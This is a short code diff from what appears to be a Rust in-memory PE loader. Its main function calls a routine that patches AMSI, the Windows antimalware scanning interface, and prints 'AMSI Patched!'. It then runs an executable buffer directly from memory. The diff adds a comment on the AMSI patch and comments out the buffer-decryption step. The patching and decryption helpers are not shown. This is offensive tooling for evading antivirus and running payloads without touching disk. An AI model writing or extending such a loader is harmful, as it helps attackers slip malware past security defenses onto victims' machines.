@@ -39,7 +39,7 @@ async fn main(){
         }
     };
 
-
+    // Patch AMSI
     match patcher::patch_amsi(){
         Ok(_val) => {
             println!("[i] {} Patched!","AMSI".magenta());
@@ -97,8 +97,8 @@ async fn main(){
         };
 
         // Decrypt PE buffer
-        decryptor::decrypt_stream(&mut pe_buf);
-        println!("[i] Decrypted Buffer!");
+        // decryptor::decrypt_stream(&mut pe_buf);
+        // println!("[i] Decrypted Buffer!");
 
         // Load PE 
         let pe_parse = match PE::new(&pe_buf){
@@ -120,8 +120,6 @@ async fn main(){
                 memexec::memexec_exe(&pe_buf).expect("[!] Failed to run Exe");
             }
         }
-
-
     }
 
     println!("[i] {}", "Bye".green());
